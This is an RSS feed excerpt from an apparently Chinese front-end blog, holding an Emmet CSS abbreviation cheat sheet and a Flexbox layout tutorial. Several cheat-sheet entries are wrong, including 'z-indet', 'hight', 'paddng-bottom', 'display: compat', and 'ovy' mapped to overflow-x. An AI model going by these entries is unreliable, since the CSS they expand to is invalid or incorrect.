<li><strong>b</strong> =&gt; <code>bottom: ;</code></li>
<li><strong>b:a</strong> =&gt; <code>bottom: auto;</code></li>
<li><strong>r</strong> =&gt; <code>right: ;</code></li>
<li><strong>r:a</strong> =&gt; <code>right: auto;</code></li>
<li><strong>z</strong> =&gt; <code>z-indet: ;</code></li>
<li><strong>z:a</strong> =&gt; <code>z-indet: auto;</code></li>
</ul>
<h3 id="float" tabindex="-1"> float</h3>
<ul>
<li><strong>fl</strong> =&gt; <code>float: left;</code></li>
<li><strong>fl:n</strong> =&gt; <code>float: none;</code></li>
<li><strong>fl:l</strong> =&gt; <code>float: left;</code></li>
<li><strong>fl:r</strong> =&gt; <code>float: right;</code></li>
<li><strong>cl</strong> =&gt; <code>clear: both;</code></li>
<li><strong>cl:n</strong> =&gt; <code>clear: none;</code></li>
<li><strong>cl:l</strong> =&gt; <code>clear: left;</code></li>
<li><strong>cl:r</strong> =&gt; <code>clear: right;</code></li>
<li><strong>cl:b</strong> =&gt; <code>clear: both;</code></li>
</ul>
<h3 id="dispaly" tabindex="-1"> dispaly</h3>
<ul>
<li><strong>d</strong> =&gt; <code>display: block;</code></li>
<li><strong>d:n</strong> =&gt; <code>display: none;</code></li>
<li><strong>d:b</strong> =&gt; <code>display: block;</code></li>
<li><strong>d:i</strong> =&gt; <code>display: inline;</code></li>
<li><strong>d:ib</strong> =&gt; <code>display: inline-block;</code></li>
<li><strong>d:f</strong> =&gt; <code>display: flex;</code></li>
<li><strong>d:if</strong> =&gt; <code>display: inline-flex;</code></li>
<li><strong>d:li</strong> =&gt; <code>display: list-item;</code></li>
<li><strong>d:ri</strong> =&gt; <code>display: run-in;</code></li>
<li><strong>d:cp</strong> =&gt; <code>display: compat;</code></li>
<li><strong>d:tb</strong> =&gt; <code>display: table;</code></li>
<li><strong>d:itb</strong> =&gt; <code>display: inline-table;</code></li>
<li><strong>d:tbcp</strong> =&gt; <code>display: table-caption;</code></li>
<li><strong>d:tbcl</strong> =&gt; <code>display: table-column;</code></li>
<li><strong>d:tbclg</strong> =&gt; <code>display: table-column-group;</code></li>
<li><strong>d:tbhg</strong> =&gt; <code>display: table-header-group;</code></li>
<li><strong>d:tbfg</strong> =&gt; <code>display: table-footer-group;</code></li>
<li><strong>d:tbr</strong> =&gt; <code>display: table-row;</code></li>
<li><strong>d:tbrg</strong> =&gt; <code>display: table-row-group;</code></li>
<li><strong>d:tbc</strong> =&gt; <code>display: table-cell;</code></li>
</ul>
<h3 id="visibility" tabindex="-1"> visibility</h3>
<ul>
<li><strong>v</strong> =&gt; <code>visibility: hidden;</code></li>
<li><strong>v:v</strong> =&gt; <code>visibility: visible;</code></li>
<li><strong>v:h</strong> =&gt; <code>visibility: hidden;</code></li>
<li><strong>v:c</strong> =&gt; <code>visibility: collapse;</code></li>
</ul>
<h3 id="overflow" tabindex="-1"> overflow</h3>
<ul>
<li><strong>ov</strong> =&gt; <code>overflow: hidden;</code></li>
<li><strong>ov:v</strong> =&gt; <code>overflow: visible;</code></li>
<li><strong>ov:h</strong> =&gt; <code>overflow: hidden;</code></li>
<li><strong>ov:s</strong> =&gt; <code>overflow: scroll;</code></li>
<li><strong>ov:a</strong> =&gt; <code>overflow: auto;</code></li>
<li><strong>ovx</strong> =&gt; <code>overflow-x: hidden;</code></li>
<li><strong>ovx:v</strong> =&gt; <code>overflow-x: visible;</code></li>
<li><strong>ovx:h</strong> =&gt; <code>overflow-x: hidden;</code></li>
<li><strong>ovx:s</strong> =&gt; <code>overflow-x: scroll;</code></li>
<li><strong>ovx:a</strong> =&gt; <code>overflow-x: auto;</code></li>
<li><strong>ovy</strong> =&gt; <code>overflow-x: hidden;</code></li>
<li><strong>ovy:v</strong> =&gt; <code>overflow-y: visible;</code></li>
<li><strong>ovy:h</strong> =&gt; <code>overflow-y: hidden;</code></li>
<li><strong>ovy:s</strong> =&gt; <code>overflow-y: scroll;</code></li>
<li><strong>ovy:a</strong> =&gt; <code>overflow-y: auto;</code></li>
<li><strong>ovs</strong> =&gt; <code>overflow-style: scrollbar;</code></li>
<li><strong>ovs:a</strong> =&gt; <code>overflow-style: auto;</code></li>
<li><strong>ovs:s</strong> =&gt; <code>overflow-style: scrollbar;</code></li>
<li><strong>ovs:p</strong> =&gt; <code>overflow-style: panner;</code></li>
<li><strong>ovs:m</strong> =&gt; <code>overflow-style: move;</code></li>
<li><strong>ovs:mq</strong> =&gt; <code>overflow-style: marquee;</code></li>
</ul>
<h3 id="clip" tabindex="-1"> clip</h3>
<ul>
<li><strong>cp</strong> =&gt; <code>clip: ;</code></li>
<li><strong>cp:a</strong> =&gt; <code>clip: auto;</code></li>
<li><strong>cp:r</strong> =&gt; <code>clip: rect(top right bottom left);</code></li>
</ul>
<h3 id="resize" tabindex="-1"> resize</h3>
<ul>
<li><strong>rsz</strong> =&gt; <code>resize: ;</code></li>
<li><strong>rsz:n</strong> =&gt; <code>resize: none;</code></li>
<li><strong>rsz:b</strong> =&gt; <code>resize: both;</code></li>
<li><strong>rsz:h</strong> =&gt; <code>resize: horizontal;</code></li>
<li><strong>rsz:v</strong> =&gt; <code>resize: vertical;</code></li>
</ul>
<h3 id="cursor" tabindex="-1"> cursor</h3>
<ul>
<li><strong>cur</strong> =&gt; <code>cursor: pointer;</code></li>
<li><strong>cur:a</strong> =&gt; <code>cursor: auto;</code></li>
<li><strong>cur:d</strong> =&gt; <code>cursor: default;</code></li>
<li><strong>cur:c</strong> =&gt; <code>cursor: crosshair;</code></li>
<li><strong>cur:ha</strong> =&gt; <code>cursor: hand;</code></li>
<li><strong>cur:he</strong> =&gt; <code>cursor: help;</code></li>
<li><strong>cur:m</strong> =&gt; <code>cursor: move;</code></li>
<li><strong>cur:p</strong> =&gt; <code>cursor: pointer;</code></li>
<li><strong>cur:t</strong> =&gt; <code>cursor: text;</code></li>
</ul>
<h2 id="外边距和内边距" tabindex="-1"> 外边距和内边距</h2>
<h3 id="margin-padding" tabindex="-1"> margin &amp;&amp; padding</h3>
<ul>
<li><strong>m</strong> =&gt; <code>margin: ;</code></li>
<li><strong>m:a</strong> =&gt; <code>margin: auto;</code></li>
<li><strong>mt</strong> =&gt; <code>margin-top: ;</code></li>
<li><strong>mt:a</strong> =&gt; <code>margin-top: auto;</code></li>
<li><strong>mr</strong> =&gt; <code>margin-right: ;</code></li>
<li><strong>mr:a</strong> =&gt; <code>margin-right: auto;</code></li>
<li><strong>mb</strong> =&gt; <code>margin-bottom: ;</code></li>
<li><strong>mb:a</strong> =&gt; <code>margin-bottom: auto;</code></li>
<li><strong>ml</strong> =&gt; <code>margin-left: ;</code></li>
<li><strong>ml-a</strong> =&gt; <code>margin-left: auto;</code></li>
<li><strong>p</strong> =&gt; <code>padding: ;</code></li>
<li><strong>pt</strong> =&gt; <code>padding-top: ;</code></li>
<li><strong>pr</strong> =&gt; <code>padding-right: ;</code></li>
<li><strong>pb</strong> =&gt; <code>paddng-bottom: ;</code></li>
<li><strong>pl</strong> =&gt; <code>padding-left: ;</code></li>
</ul>
<h2 id="盒子模型" tabindex="-1"> 盒子模型</h2>
<h3 id="box" tabindex="-1"> box</h3>
<ul>
<li><strong>bxz</strong> =&gt; <code>box-sizing: border-box;</code></li>
<li><strong>bxz:cb</strong> =&gt; <code>box-sizing: content-box;</code></li>
<li><strong>bxz:bb</strong> =&gt; <code>box-sizing: border-box;</code></li>
<li><strong>bxsh</strong> =&gt; <code>box-shadow: inset hoff voff blur color;</code></li>
<li><strong>bxsh:r</strong> =&gt; <code>box-shadow: inset hoff voff blur spread rgb(0, 0, 0);</code></li>
<li><strong>bxsh:ra</strong> =&gt; <code>box-shadow: inset h v blur spread rgba(0, 0, 0, .5);</code></li>
<li><strong>bxsh:n</strong> =&gt; <code>box-shadow: none;</code></li>
</ul>
<h3 id="width-hight" tabindex="-1"> width &amp;&amp; hight</h3>
<ul>
<li><strong>w</strong> =&gt; <code>width: ;</code></li>
<li><strong>w:a</strong> =&gt; <code>width: auto;</code></li>
<li><strong>h</strong> =&gt; <code>hight: ;</code></li>
<li><strong>h:a</strong> =&gt; <code>hight: auto;</code></li>
<li><strong>maw</strong> =&gt; <code>max-width: ;</code></li>
<li><strong>maw:n</strong> =&gt; <code>max-width: none;</code></li>
<li><strong>mah</strong> =&gt; <code>max-hight: ;</code></li>
<li><strong>mah:n</strong> =&gt; <code>max-hight: none;</code></li>
<li><strong>miw</strong> =&gt; <code>min-width: ;</code></li>
<li><strong>mih</strong> =&gt; <code>min-hight: ;</code></li>
</ul>
<h2 id="字体和文本" tabindex="-1"> 字体和文本</h2>
<h3 id="font" tabindex="-1"> font</h3>
<ul>
<li><strong>f</strong> =&gt; <code>font: ;</code></li>
<li><strong>f+</strong> =&gt; <code>font: 1em Arial,sans-serif;</code></li>
<li><strong>fw</strong> =&gt; <code>font-weight: ;</code></li>
<li><strong>fw:n</strong> =&gt; <code>font-weight: none;</code></li>
<li><strong>fw:b</strong> =&gt; <code>font-weight: bold;</code></li>
<li><strong>fw:br</strong> =&gt; <code>font-weight: bolder;</code></li>
<li><strong>fw:lr</strong> =&gt; <code>font-weight: lighter;</code></li>
<li><strong>fs</strong> =&gt; <code>font-style: italic;</code></li>
<li><strong>fs:n</strong> =&gt; <code>font-style: normal;</code></li>
<li><strong>fs:i</strong> =&gt; <code>font-style: italic;</code></li>
<li><strong>fs:o</strong> =&gt; <code>font-style: oblique;</code></li>
<li><strong>fv</strong> =&gt; <code>font-variant: ;</code></li>
<li><strong>fv:n</strong> =&gt; <code>font-variant: normal;</code></li>
<li><strong>fv:sc</strong> =&gt; <code>font-variant: small-caps;</code></li>
<li><strong>fz</strong> =&gt; <code>font-size: ;</code></li>
<li><strong>fza</strong> =&gt; <code>font-size-adjust: ;</code></li>
<li><strong>fza:n</strong> =&gt; <code>font-size-adjust: none;</code></li>
<li><strong>ff</strong> =&gt; <code>font-family: ;</code></li>
<li><strong>ff:s</strong> =&gt; <code>font-family: serif;</code></li>
<li><strong>ff:ss</strong> =&gt; <code>font-family: sans-serif;</code></li>
<li><strong>ff:c</strong> =&gt; <code>font-family: cursive;</code></li>
<li><strong>ff:f</strong> =&gt; <code>font-family: fantasy;</code></li>
<li><strong>ff:m</strong> =&gt; <code>font-family: monospace;</code></li>
<li><strong>ff:a</strong> =&gt; <code>font-family: Arial, &quot;Helvetica Neue&quot;, Helvetica, sans-serif;</code></li>
<li><strong>fef</strong> =&gt; <code>font-effect: ;</code></li>
<li><strong>fef:n</strong> =&gt; <code>font-effect: none;</code></li>
<li><strong>fef:eg</strong> =&gt; <code>font-effect: engrave;</code></li>
<li><strong>fef:eb</strong> =&gt; <code>font-effect: emboss;</code></li>
<li><strong>fef:o</strong> =&gt; <code>font-effect: outline;</code></li>
<li><strong>@i</strong> =&gt; <code>@import url();</code></li>
<li><strong>@f</strong> =&gt;</li>
</ul>
<div><pre><code><span><span>@font-face</span></span> <span>{</span>
  <span>font-family</span><span>:</span> <span>;</span>
  <span>src</span><span>:</span> <span><span>url</span><span>(</span><span>)</span></span><span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><ul>
<li><strong>@f+</strong> =&gt;</li>
</ul>
<div><pre><code><span><span>@font-face</span></span> <span>{</span>
  <span>font-family</span><span>:</span> <span>"FontName"</span><span>;</span>
  <span>src</span><span>:</span> <span><span>url</span><span>(</span><span>"FileName.eot"</span><span>)</span></span><span>;</span>
  <span>src</span><span>:</span> <span><span>url</span><span>(</span><span>"FileName.eot?#iefix"</span><span>)</span></span> <span>format</span><span>(</span><span>"embedded-opentype"</span><span>)</span><span>,</span> <span><span>url</span><span>(</span><span>"FileName.woff"</span><span>)</span></span>
      <span>format</span><span>(</span><span>"woff"</span><span>)</span><span>,</span> <span><span>url</span><span>(</span><span>"FileName.ttf"</span><span>)</span></span> <span>format</span><span>(</span><span>"truetype"</span><span>)</span><span>,</span> <span><span>url</span><span>(</span><span>"FileName.svg#FontName"</span><span>)</span></span>
      <span>format</span><span>(</span><span>"svg"</span><span>)</span><span>;</span>
  <span>font-style</span><span>:</span> normal<span>;</span>
  <span>font-weight</span><span>:</span> normal<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="vertical" tabindex="-1"> vertical</h3>
<ul>
<li><strong>va</strong> =&gt; <code>vertical-align: top;</code></li>
<li><strong>va:sup</strong> =&gt; <code>vertical-align: super;</code></li>
<li><strong>va:t</strong> =&gt; <code>vertical-align: top;</code></li>
<li><strong>va:tt</strong> =&gt; <code>vertical-align: text-top;</code></li>
<li><strong>va:m</strong> =&gt; <code>vertical-align: middle;</code></li>
<li><strong>va:bl</strong> =&gt; <code>vertical-align: baseline;</code></li>
<li><strong>va:b</strong> =&gt; <code>vertical-align: bottom;</code></li>
<li><strong>va:tb</strong> =&gt; <code>vertical-align: text-bottom;</code></li>
<li><strong>va:sub</strong> =&gt; <code>vertical-align: sub;</code></li>
</ul>
<h3 id="text" tabindex="-1"> text</h3>
<ul>
<li><strong>ta</strong> =&gt; <code>text-align: left;</code></li>
<li><strong>ta:l</strong> =&gt; <code>text-align: left;</code></li>
<li><strong>ta:c</strong> =&gt; <code>text-align: center;</code></li>
<li><strong>ta:r</strong> =&gt; <code>text-align: right;</code></li>
<li><strong>ta:j</strong> =&gt; <code>text-align: justify;</code></li>
<li><strong>ta-lst</strong> =&gt; <code>text-align-last: ;</code></li>
<li><strong>tal:a</strong> =&gt; <code>text-align-last: auto;</code></li>
<li><strong>tal:l</strong> =&gt; <code>text-align-last: left;</code></li>
<li><strong>tal:c</strong> =&gt; <code>text-align-last: center;</code></li>
<li><strong>tal:r</strong> =&gt; <code>text-align-last: right;</code></li>
<li><strong>tov</strong> =&gt; <code>text-overflow: ellipsis;</code></li>
<li><strong>tov:c</strong> =&gt; <code>text-overflow: clip;</code></li>
<li><strong>tov:e</strong> =&gt; <code>text-overflow: ellipsis;</code></li>
<li><strong>td</strong> =&gt; <code>text-decoration: none;</code></li>
<li><strong>td:n</strong> =&gt; <code>text-decoration: none;</code></li>
<li><strong>td:u</strong> =&gt; <code>text-decoration: underline;</code></li>
<li><strong>td:o</strong> =&gt; <code>text-decoration: overline;</code></li>
<li><strong>td:l</strong> =&gt; <code>text-decoration: line;</code></li>
</ul>
<h2 id="css-3-动画" tabindex="-1"> CSS 3 动画</h2>
<h3 id="keyframes" tabindex="-1"> keyframes</h3>
<ul>
<li><strong>@kf</strong> =&gt;</li>
</ul>
<div><pre><code><span><span>@-webkit-keyframes</span> identifier</span> <span>{</span>
  <span>from</span> <span>{</span>
  <span>}</span>

  <span>to</span> <span>{</span>
  <span>}</span>
<span>}</span>

<span><span>@-o-keyframes</span> identifier</span> <span>{</span>
  <span>from</span> <span>{</span>
  <span>}</span>

  <span>to</span> <span>{</span>
  <span>}</span>
<span>}</span>

<span><span>@-moz-keyframes</span> identifier</span> <span>{</span>
  <span>from</span> <span>{</span>
  <span>}</span>

  <span>to</span> <span>{</span>
  <span>}</span>
<span>}</span>

<span><span>@keyframes</span> identifier</span> <span>{</span>
  <span>from</span> <span>{</span>
  <span>}</span>

  <span>to</span> <span>{</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="animation" tabindex="-1"> animation</h3>
<ul>
<li><strong>anim-</strong> =&gt; <code>animation: name duration timing-function delay iteration-count direction fill-mode;</code></li>
<li><strong>animdel</strong> =&gt; <code>animation-delay: time;</code></li>
<li><strong>animdir</strong> =&gt; <code>animation-direction: normal;</code></li>
<li><strong>animdir:a</strong> =&gt; <code>animation-direction: alternate;</code></li>
<li><strong>animdir:ar</strong> =&gt; <code>animation-direction: alternate;</code></li>
<li><strong>animdir:n</strong> =&gt; <code>animation-direction: normal;</code></li>
<li><strong>animdir:r</strong> =&gt; <code>animation-direction: reverse;</code></li>
</ul>
<h3 id="transform" tabindex="-1"> transform</h3>
<ul>
<li><strong>trf</strong> =&gt; <code>transform: ;</code></li>
<li><strong>trf:r</strong> =&gt; <code>transform: rotate(angle);</code></li>
<li><strong>trf:sc</strong> =&gt; <code>transform: scale(x, y);</code></li>
<li><strong>trf:scx</strong> =&gt; <code>transform: scale(x);</code></li>
<li><strong>trf:scy</strong> =&gt; <code>transform: scale(y);</code></li>
<li><strong>trf:skx</strong> =&gt; <code>transform: skewX(angle);</code></li>
<li><strong>trf:sky</strong> =&gt; <code>transform: skewY(angle);</code></li>
<li><strong>trf:t</strong> =&gt; <code>transform: translate(x, y);</code></li>
<li><strong>trf:tx</strong> =&gt; <code>transform: translateX(x);</code></li>
<li><strong>trf:ty</strong> =&gt; <code>transform: translateY(y);</code></li>
<li><strong>trfo</strong> =&gt; <code>transform-origin: ;</code></li>
<li><strong>trfs</strong> =&gt; <code>transform-style: preserve-3d;</code></li>
</ul>
<h3 id="transition" tabindex="-1"> transition</h3>
<ul>
<li><strong>trs</strong> =&gt; <code>transition: prop time;</code></li>
<li><strong>trsde</strong> =&gt; <code>transition-delay: time;</code></li>
<li><strong>trsdu</strong> =&gt; <code>transition-duration: time;</code></li>
<li><strong>trsp</strong> =&gt; <code>transition-property: prop;</code></li>
<li><strong>trstf</strong> =&gt; <code>transition-timing-function: tfunc;</code> # 更多用法实例</li>
</ul>
<p>在线查看查看 <a href="http://oss-blog.test.upcdn.net/emmet-usage-examples.jpg" target="_blank" rel="noopener noreferrer">emmet-usage-examples.jpg</a><br> 请下载查看 <a href="http://oss-blog.test.upcdn.net/emmet-usage-examples.jpg?attname=" target="_blank" rel="noopener noreferrer">emmet-usage-examples.jpg</a></p>
]]></content:encoded>
    </item>
    <item>
      <title>Flexbox 布局</title>
      <link>https://vxhly.github.io/views/manual/flexbox-layout.html</link>
      <guid>https://vxhly.github.io/views/manual/flexbox-layout.html</guid>
      <source url="https://vxhly.github.io/rss.xml">Flexbox 布局</source>
      <description>前言
Flex 布局, 可以简便、完整、响应式地实现各种页面布局, 目前, 它已经得到了所有浏览器的支持。

</description>
      <category>manual</category>
      <pubDate>Thu, 11 Aug 2016 14:27:56 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>Flex 布局, 可以简便、完整、响应式地实现各种页面布局, 目前, 它已经得到了所有浏览器的支持。</p>
</div>

<h2 id="githhub-上优秀的样式表插件" tabindex="-1"> GithHub 上优秀的样式表插件</h2>
<p><a href="http://github.com/vxhly/scss-flex" target="_blank" rel="noopener noreferrer">scss-flex.css</a><br> <a href="http://github.com/lzxb/flex.css" target="_blank" rel="noopener noreferrer">flex.css</a></p>
<h2 id="例子" tabindex="-1"> 例子</h2>
<p><a href="https://codepen.io/vxhly/pen/NXwejK" target="_blank" rel="noopener noreferrer">flexbox 布局例子</a></p>
<h2 id="flex-布局是什么" tabindex="-1"> Flex 布局是什么？</h2>
<p>Flex 是 Flexible Box 的缩写, 意为&quot;弹性布局&quot;, 用来为盒状模型提供最大的灵活性。 任何一个容器都可以指定为 Flex 布局。</p>
<h3 id="启用-flex-布局" tabindex="-1"> 启用 Flex 布局</h3>
<p>设为 Flex 布局以后, 子元素的 float、clear 和 vertical-align 属性将失效</p>
<div><pre><code><span>/* 块级元素启用 Flex 布局 */</span>
<span>.box-flex</span> <span>{</span>
  <span>display</span><span>:</span> -ms-flexbox<span>;</span>
  <span>display</span><span>:</span> -webkit-box<span>;</span>
  <span>display</span><span>:</span> flex<span>;</span>
<span>}</span>

<span>/* 行内元素启用 Flex 布局 */</span>
<span>.box-inline-flex</span> <span>{</span>
  <span>display</span><span>:</span> -ms-inline-flexbox<span>;</span>
  <span>display</span><span>:</span> -webkit-inline-box<span>;</span>
  <span>display</span><span>:</span> inline-flex<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="基本概念" tabindex="-1"> 基本概念</h2>
<div><p>提示</p>
<p>采用 Flex 布局的元素, 称为 Flex 容器（flex container）, 简称&quot;容器&quot;。它的所有子元素自动成为容器成员, 称为 Flex 项目（flex item）, 简称&quot;项目&quot;。</p>
</div>
<p><img src="/assets/flex-layout.png" alt="flex layout"></p>
<div><p>提示</p>
<p>容器默认存在两根轴: 水平的主轴（main axis）和垂直的交叉轴（cross axis）。主轴的开始位置（与边框的交叉点）叫做 <code>main start</code> , 结束位置叫做 <code>main end</code> ；交叉轴的开始位置叫做 <code>cross start</code> , 结束位置叫做 <code>cross end</code> 。<br> 项目默认沿主轴排列。单个项目占据的主轴空间叫做 <code>main size</code> , 占据的交叉轴空间叫做 <code>cross size</code> 。</p>
</div>
<h2 id="容器的属性" tabindex="-1"> 容器的属性</h2>
<p>以下 6 个属性设置在容器上。</p>
<ul>
<li><strong>flex-direction</strong></li>
<li><strong>flex-wrap</strong></li>
<li><strong>flex-flow</strong></li>
<li><strong>justify-content</strong></li>
<li><strong>align-items</strong></li>
<li><strong>align-content</strong></li>
</ul>
<h3 id="flex-direction" tabindex="-1"> flex-direction</h3>
<div><p>属性作用</p>
<p><code>flex-direction</code> 属性决定主轴的方向（即项目的排列方向）。</p>
</div>
<div><pre><code><span>.box</span> <span>{</span>
  <span>flex-direction</span><span>:</span> row | row-reverse | column | column-reverse<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h4 id="四个值分别的作用" tabindex="-1"> 四个值分别的作用</h4>
<ul>
<li>row（默认值）主轴为水平方向, 起点在左端。</li>
<li>row-reverse: 主轴为水平方向, 起点在右端。</li>
<li>column: 主轴为垂直方向, 起点在上沿。</li>
<li>column-reverse: 主轴为垂直方向, 起点在下沿。</li>
</ul>
<h3 id="flex-wrap" tabindex="-1"> flex-wrap</h3>
<div><p>属性作用</p>
<p><code>flex-wrap</code> 属性定义, 如果一条轴线排不下, 如何换行。默认情况下, 项目都排在一条线（又称&quot;轴线&quot;）上。</p>
</div>
<div><pre><code><span>.box</span> <span>{</span>
  <span>flex-wrap</span><span>:</span> nowrap | wrap | wrap-reverse<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h4 id="三个值分别的作用" tabindex="-1"> 三个值分别的作用</h4>
<ul>
<li>nowrap（默认）不换行。</li>
<li>wrap: 换行, 第一行在上方。</li>
<li>wrap-reverse: 换行, 第一行在下方。</li>
</ul>
<h3 id="flex-flow" tabindex="-1"> flex-flow</h3>
<div><p>属性作用</p>
<p><code>flex-flow</code> 属性是 <code>flex-direction</code> 属性和 <code>flex-wrap</code> 属性的简写形式, 默认值为 <code>row nowrap</code> 。</p>
</div>
<div><pre><code><span>.box</span> <span>{</span>
  <span>flex-flow</span><span>:</span> &lt;flex-direction> || &lt;flex-wrap><span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h3 id="justify-content" tabindex="-1"> justify-content</h3>
<div><p>属性作用</p>
<p><code>justify-content</code> 属性定义了项目在主轴上的对齐方式。</p>
</div>
<div><pre><code><span>.box</span> <span>{</span>
  <span>justify-content</span><span>:</span> flex-start | flex-end | center | space-between | space-around<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p><img src="/assets/flex-justify.png" alt="justify-content"></p>
<h4 id="五个值分别的作用" tabindex="-1"> 五个值分别的作用</h4>
<ul>
<li>flex-start（默认值）左对齐</li>
<li>flex-end: 右对齐</li>
<li>center: 居中</li>
<li>space-between: 两端对齐, 项目之间的间隔都相等。</li>
<li>space-around: 每个项目两侧的间隔相等。所以, 项目之间的间隔比项目与边框的间隔大一倍。</li>
</ul>
<h3 id="align-items" tabindex="-1"> align-items</h3>
<div><p>属性作用</p>
<p><code>align-items</code> 属性定义项目在交叉轴上如何对齐。</p>
</div>
<div><pre><code><span>.box</span> <span>{</span>
  <span>align-items</span><span>:</span> flex-start | flex-end | center | baseline | stretch<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p><img src="/assets/flex-align.png" alt="align-items"></p>
<h4 id="五个值分别的作用-1" tabindex="-1"> 五个值分别的作用</h4>
<ul>
<li>flex-start: 交叉轴的起点对齐。</li>
<li>flex-end: 交叉轴的终点对齐。</li>
<li>center: 交叉轴的中点对齐。</li>
<li>baseline: 项目的第一行文字的基线对齐。</li>
<li>stretch（默认值）如果项目未设置高度或设为 auto, 将占满整个容器的高度。</li>
</ul>
<h3 id="align-content" tabindex="-1"> align-content</h3>
<div><p>属性作用</p>
<p><code>align-content</code> 属性定义了多根轴线的对齐方式。如果项目只有一根轴线, 该属性不起作用。</p>
</div>
<div><pre><code><span>.box</span> <span>{</span>
  <span>align-content</span><span>:</span> flex-start | flex-end | center | space-between | space-around |
    stretch<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><p><img src="/assets/flex-content.png" alt="align-content"></p>
<h4 id="六个值分别的作用" tabindex="-1"> 六个值分别的作用</h4>
<ul>
<li>flex-start: 与交叉轴的起点对齐。</li>
<li>flex-end: 与交叉轴的终点对齐。</li>
<li>center: 与交叉轴的中点对齐。</li>
<li>space-between: 与交叉轴两端对齐, 轴线之间的间隔平均分布。</li>
<li>space-around: 每根轴线两侧的间隔都相等。所以, 轴线之间的间隔比轴线与边框的间隔大一倍。</li>
<li>stretch（默认值）轴线占满整个交叉轴。</li>
</ul>
<h2 id="项目的属性" tabindex="-1"> 项目的属性</h2>
<p>以下 6 个属性设置在项目上。</p>
<ul>
<li><strong>order</strong></li>
<li><strong>flex-grow</strong></li>
<li><strong>flex-shrink</strong></li>
<li><strong>flex-basis</strong></li>
<li><strong>flex</strong></li>
<li><strong>align-self</strong></li>
</ul>
<h3 id="order" tabindex="-1"> order</h3>
<div><p>属性作用</p>
<p><code>order</code> 属性定义项目的排列顺序。数值越小, 排列越靠前, 默认为 0。</p>
</div>
<div><pre><code><span>.item</span> <span>{</span>
  <span>order</span><span>:</span> &lt;integer><span>;</span>
  <span>/* default 0 */</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><p><img src="/assets/flex-order.png" alt="order"></p>
<h3 id="flex-grow" tabindex="-1"> flex-grow</h3>
<div><p>属性作用</p>
<p><code>flex-grow</code> 属性定义项目的放大比例, 默认为 0, 即如果存在剩余空间, 也不放大。</p>
</div>
<div><pre><code><span>.item</span> <span>{</span>
  <span>flex-grow</span><span>:</span> &lt;number><span>;</span>
  <span>/* default 0 */</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><p><img src="/assets/flex-grow.png" alt="flex-grow"></p>
<div><p>提示</p>
<p>如果所有项目的 <code>flex-grow</code> 属性都为 1, 则它们将等分剩余空间（如果有的话）。如果一个项目的 <code>flex-grow</code> 属性为 2, 其他项目都为 1, 则前者占据的剩余空间将比其他项多一倍。</p>
</div>
<h3 id="flex-shrink" tabindex="-1"> flex-shrink</h3>
<div><p>属性作用</p>
<p><code>flex-shrink</code> 属性定义了项目的缩小比例, 默认为 1, 即如果空间不足, 该项目将缩小。剩余空间将比其他项多一倍。</p>
</div>
<div><pre><code><span>.item</span> <span>{</span>
  <span>flex-shrink</span><span>:</span> &lt;number><span>;</span>
  <span>/* default 1 */</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><p><img src="/assets/flex-shrink.jpg" alt="flex-shrink"></p>
<div><p>提示</p>
<p>如果所有项目的 <code>flex-shrink</code> 属性都为 1, 当空间不足时, 都将等比例缩小。如果一个项目的 flex-shrink 属性为 0, 其他项目都为 1, 则空间不足时, 前者不缩小。负值对该属性无效。</p>
</div>
<h3 id="flex-basis" tabindex="-1"> flex-basis</h3>
<div><p>属性作用</p>
<p><code>flex-basis</code> 属性定义了在分配多余空间之前, 项目占据的主轴空间（main size）。浏览器根据这个属性, 计算主轴是否有多余空间。它的默认值为 auto, 即项目的本来大小。</p>
</div>
<div><pre><code><span>.item</span> <span>{</span>
  <span>flex-basis</span><span>:</span> &lt;length> | auto<span>;</span>
  <span>/* default auto */</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><p>它可以设为跟 <code>width</code> 或 <code>height</code> 属性一样的值（比如 350px）, 则项目将占据固定空间。</p>
<h3 id="flex" tabindex="-1"> flex</h3>
<div><p>属性作用</p>
<p><code>flex</code> 属性是 <code>flex-grow</code> , <code>flex-shrink</code> 和 <code>flex-basis</code> 的简写, 默认值为 <code>0 1 auto</code> 。后两个属性可选。</p>
</div>
<div><pre><code><span>.item</span> <span>{</span>
  <span>flex</span><span>:</span> none | [ &lt; <span>"flex-grow"</span> > &lt; <span>"flex-shrink"</span> >? || &lt; <span>"flex-basis"</span> >]<span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><div><p>提示</p>
<p>该属性有两个快捷值: <code>auto (1 1 auto)</code> 和 <code>none (0 0 auto)</code> 。 建议优先使用这个属性, 而不是单独写三个分离的属性, 因为浏览器会推算相关值。</p>
</div>
<h3 id="align-self" tabindex="-1"> align-self</h3>
<div><p>属性作用</p>
<p><code>align-self</code> 属性允许单个项目有与其他项目不一样的对齐方式, 可覆盖 <code>align-items</code> 属性。默认值为 <code>auto</code> , 表示继承父元素的 <code>align-items</code> 属性, 如果没有父元素, 则等同于 <code>stretch</code> 。 :::</p>
